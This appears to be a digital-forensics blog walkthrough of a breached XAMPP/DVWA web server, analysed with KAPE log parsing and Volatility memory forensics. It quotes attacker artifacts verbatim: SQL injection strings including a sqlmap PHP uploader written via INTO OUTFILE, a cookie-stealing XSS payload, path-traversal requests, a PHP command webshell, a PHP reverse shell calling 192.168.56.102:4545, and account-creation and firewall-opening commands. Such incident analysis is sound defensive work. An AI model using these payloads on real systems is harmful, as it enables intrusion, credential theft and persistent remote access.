---
title: "Web server breached"
date: 2026-05-02
draft: false
image: brand_image.jpg
tags: ["Volatility", "Kape"]
series: "Hunting the hunter"
---

- Reading time : "6 min"

# Executive Summary

1. **Scope.** A company web server was compromised via the hosted site. The team captured a forensic disk image and a live memory dump in time for offline analysis. Artifacts for this walkthrough: [archive.org: dfir-case1](https://archive.org/details/dfir-case1).

2. **Web layer.** Apache access and error logs show repeated OWASP-style abuse: SQL injection (including attempted `INTO OUTFILE` / upload-style payloads), reflected XSS, local file inclusion / path traversal, and an IDS log-clear request consistent with covering tracks on the app.

3. **Host & memory.** Disk review (XAMPP on Windows) plus Volatility against the memory image show post-exploitation behavior: shell-style PHP in process memory, reverse-shell–like strings, user creation (`net user`), RDP group membership changes, and Windows Firewall rules opened for Remote Desktop—alongside evidence the attacker tampered with logs (anti-forensics).

# Detailed Technical Analysis

## Disk image

With the disk image available, first pass is filesystem triage in **FTK Imager**. The host runs **XAMPP**; **Apache** access and error logs live under `xampp\apache\logs` (default layout).


![FTK Imager view of the XAMPP / Apache log layout](/images/ftk.png "XAMPP Apache logs in FTK Imager")


**Arsenal Image Mounter (AIM)** mounts the forensic image read-only so it appears as a volume (e.g. in Explorer). That enables **KAPE** and other tools to pull targets without guessing raw offsets.

### KAPE: collecting XAMPP logs

**KAPE** (Kroll Artifact Parser and Extractor) was used to extract Apache and related XAMPP artifacts reproducibly. Example invocation (adjust `--tsource` / drive letter to your mount):

```
\kape.exe --tsource E: --tdest C:\Users\dfir\Downloads\KapeOutput\TargetKape --tflush --target Xampp --msource C:\Users\dfir\Downloads\KapeOutput\TargetKape --mdest C:\Users\dfir\Downloads\KapeOutput\ModuleKape --mflush --module XAMPP_Recursive_AllLogs --gui
```

### Parsing the CSV exports

The KAPE **Log Parser** module normalizes `access.log`, `error.log`, and companion text logs into **CSV** for sort/pivot. For volume, a small internal web UI ingested that CSV and **tagged** lines (SQLi, XSS, traversal, and related patterns) instead of hand-scrolling megabytes of raw NCSA / error text.

#### Web attacks observed

Representative hits from the classifier:

**SQL injection**

```
GET /dvwa/vulnerabilities/sqli/?id=a'+or+1=1&Submit=Submit HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=abc'+and+0=0+union+select+table_name,+null+from+information_scheme+--+&Submit=Submit HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=2 AND (SELECT 1487 FROM(SELECT COUNT(*),CONCAT(0x7178717871,(SELECT (ELT(1487=1487,1))),0x717a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- pAEG&Submit=Submit HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=2 AND 5554=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (5554=5554) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&Submit=Submit HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=2' AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM phpmyadmin.pma_relation),2,1))>48 AND 'vwHI'='vwHI&Submit=Submit HTTP/1.1


GET /dvwa/vulnerabilities/sqli/?id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpukudk.php' LINES TERMINATED BY <?php
if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";}?>
-- -- &Submit=Submit HTTP/1.1

GET /dvwa/vulnerabilities/sqli/?id=2';SELECT BENCHMARK(5000000,MD5(0x54425171)) AND 'DthE'='DthE&Submit=Submit HTTP/1.1

```

**RCE-adjacent / XSS / log manipulation**

```
GET /dvwa/ids_log.php?clear_log=Clear+Log HTTP/1.1
GET /dvwa/?test="><script>eval(window.name)</script> HTTP/1.1
GET /dvwa/vulnerabilities/xss_r/?name=<script>document.location="http://192.168.56.102/?"+document.cookie;</script> HTTP/1.1
GET /dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script> HTTP/1.1
	200

```

**Path traversal / LFI**

```
GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../xampp/phpMyAdmin/config.inc.txt HTTP/1.1
GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../users/administrator/data.txt HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit&Btta=5769 AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd HTTP/1.1
```

<!-- Replace YOUR_ID with your YouTube video id. -->

<a href="https://www.youtube.com/watch?v=QCCTmnMkRuI">
  <img src="https://img.youtube.com/vi/QCCTmnMkRuI/0.jpg" width="600"/>
</a>

## Memory analysis

The web tier is a natural place for a **webshell**: the `httpd.exe` worker holds request-time strings, PHP, and command output even when disk logs are edited or deleted.

**Volatility 2 profile:** `Win2008SP1x86` (Windows Server 2008 SP1, x86), aligned with the memory sample.

Processes that mattered here: two **`httpd.exe`** instances (parent 2796, worker 2880) under **`xampp-control.exe`**, **`mysqld.exe`**, and two **`cmd.exe`** sessions (PIDs **612** and **1972**) under **`explorer.exe`** — good anchors for `consoles`, `cmdscan`, and targeted dumps.

Example Volatility invocations:

```
$ vol2.py -f memdump.mem --profile=Win2008SP1x86 pstree
vol2.py -f /cases/triage/memdump.mem --profile=Win2008SP1x86 consoles
vol2.py -f /cases/triage/memdump.mem --profile=Win2008SP1x86 cmdscan
$ vol -f /cases/triage/memdump.mem -r pretty windows.pstree --pid 484
vol -f /cases/triage/memdump.mem -r pretty windows.pstree --pid 2880
```

### Findings from memory-resident artifacts

`cmdscan` / related output included recon and persistence-oriented commands:

```

Cmd #0 @ 0xe907c8: ipconfig
Cmd #1 @ 0xe91af8: cls
Cmd #2 @ 0xe91db0: ipconfig
Cmd #3 @ 0x5a34bd0: net user user1 user1 /add
Cmd #4 @ 0x5a34eb8: net user user1 root@psut /add
Cmd #5 @ 0x5a34c10: net user user1 Root@psut /add
Cmd #6 @ 0x5a24800: cls
Cmd #7 @ 0x5a34c58: net /?
Cmd #8 @ 0x5a34d88: net localgroup /?
Cmd #9 @ 0x5a34f48: net localgroup "Remote Desktop Users" user1 /add
Cmd #10 @ 0x5a34c70: net /?
Cmd #11 @ 0xe911b0: netsh /?
Cmd #12 @ 0xe907e8: netsh firewall /?
Cmd #13 @ 0xe91218: netsh firewall set service type = remotedesktop /?
Cmd #14 @ 0xe91288: netsh firewall set service type = remotedesktop enable
Cmd #15 @ 0xe91300: netsh firewall set service type=remotedesktop mode=enable
Cmd #16 @ 0xe91380: netsh firewall set service type=remotedesktop mode=enable 

     "#<?php",
        "<?php $c=$_REQUEST[\"cmd\"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c.\" 2>&1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NUL",
        "//<?php error_reporting(0); $ip = '192.168.56.102'; $port = 4545; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no soc",
        "//<?php"
"Zp6.102+%26%26+net+user+hacker+hacker+/add&submit=submit"
"ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&submit=submit$"
```

Together, disk logs and memory tell a short story: noisy web exploitation, possible log cleanup at the application layer, then host-level account and firewall changes consistent with maintaining access beyond the initial PHP/SQLi path.

<a href="https://www.youtube.com/watch?v=JA2hN3wiyeU">
  <img src="https://img.youtube.com/vi/JA2hN3wiyeU/0.jpg" width="600"/>
</a>
